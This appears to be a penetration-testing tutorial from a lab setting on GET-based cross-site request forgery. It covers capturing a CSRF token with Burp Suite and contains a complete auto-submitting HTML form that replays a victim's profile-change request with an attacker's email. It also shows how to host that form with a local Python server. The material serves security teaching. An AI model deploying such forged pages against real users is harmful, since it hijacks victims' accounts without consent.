# Cross-Site Request Forgery (GET-based)

CSRF tokens are designed to protect web applications from unauthorized actions initiated by authenticated users. However, if these tokens are transmitted over unencrypted connections, they can be intercepted and exploited by attackers. Understanding how to extract and utilize CSRF tokens is crucial for penetration testers.

***

#### 🔍 Understanding CSRF Token Vulnerabilities

CSRF tokens are meant to ensure that requests made to a web application are legitimate and originate from authenticated users. If an attacker can sniff these tokens from unencrypted requests, they can craft malicious requests that impersonate the victim.

**Key Characteristics of CSRF Token Vulnerabilities:**

* **Unencrypted Requests**: If CSRF tokens are sent over HTTP instead of HTTPS, they can be intercepted.
* **Predictable Token Values**: If the token values can be guessed or reused, they become less effective as a security measure.

***

#### 🧪 Testing for CSRF Token Vulnerabilities

To test for CSRF token vulnerabilities, follow these steps:

1. **Log into the Target Application**: Use valid credentials to access the application.
2.  **Capture Requests**: Use Burp Suite to intercept requests when performing actions that include CSRF tokens. For example, when saving user data, you might see a request like this:

    {% code overflow="wrap" %}
    ```
    GET /app/save/user@example.com?email=attacker@htb.net&telephone=(227)-750-8112&country=CSRF_POC&action=save&csrf=30e7912d04c957022a6d3072be8ef67e52eda8f2
    ```
    {% endcode %}
3.  **Create a Malicious Web Page**: Craft an HTML page that mimics the legitimate request, including the captured CSRF token. Here’s an example:

    {% code overflow="wrap" %}
    ```html
    htmlCopy Code<html>
      <body>
        <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
          <input type="hidden" name="email" value="attacker@htb.net" />
          <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
          <input type="hidden" name="country" value="CSRF_POC" />
          <input type="hidden" name="action" value="save" />
          <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.getElementById("submitMe").submit()
        </script>
      </body>
    </html>
    ```
    {% endcode %}
4.  **Serve the Malicious Page**: Use a simple HTTP server to host the malicious page. For example, run:

    ```bash
    python -m http.server 1337
    ```
5. **Simulate the Attack**: While logged into the target application, open a new tab and navigate to the URL of the malicious page. This will trigger the CSRF attack, changing the victim's profile details to those specified in the HTML form.

***

#### 📜 Example of a CSRF Token Attack

1. **Login to the Target Application**: Use valid credentials to log in.
2. **Capture the CSRF Token**: Use Burp Suite to intercept the request that includes the CSRF token.
3. **Execute the Attack**: Open the crafted malicious page while still logged in. The profile details will change to those specified in the HTML form.

#### 🌐 Resources for Further Learning

* [Sending form data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data)
